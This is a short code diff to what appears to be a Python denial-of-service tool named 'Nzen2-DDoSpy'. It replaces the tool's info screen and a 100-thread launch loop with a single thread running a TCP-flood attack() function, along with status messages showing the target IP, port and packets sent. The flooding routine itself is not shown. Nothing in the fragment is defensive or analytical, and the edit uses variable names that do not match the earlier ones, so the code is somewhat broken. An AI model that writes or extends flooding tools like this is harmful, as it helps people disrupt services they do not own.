@@ -110,22 +110,23 @@ def attack():
         
         print(infoui)
 
-infoui = '''
+#infoui
+infoui = threading.Thread(target=attack)
+infoui.start()
 
-Nzen2-DDoSpy Info screen:
+print('\n')
+print('[*] Attack started')
+print('')
+print('[*] Target IP: ' + target_ip)
+print('[*] Target Port: ' + target_port)
+print('')
+print('[*] Packets sent: ' + str(packets_sent))
+print('[*] Press CTRL + C to stop the attack')
+print('')
+print('[*] Press any key to continue')
 
-Attack type: TCP flood
-    Sender IP: 
-    Destination IP: '''+str(destip)+'''
-    Destination Port: '''+str(destport)+'''
+input()
 
-    Packets sent: '''+str(packets_sent)+'''
-
-            '''
-
-for i in range(0,100):
-    Thread = threading.Thread(target=attack())
-    Thread.start()
     
 
 
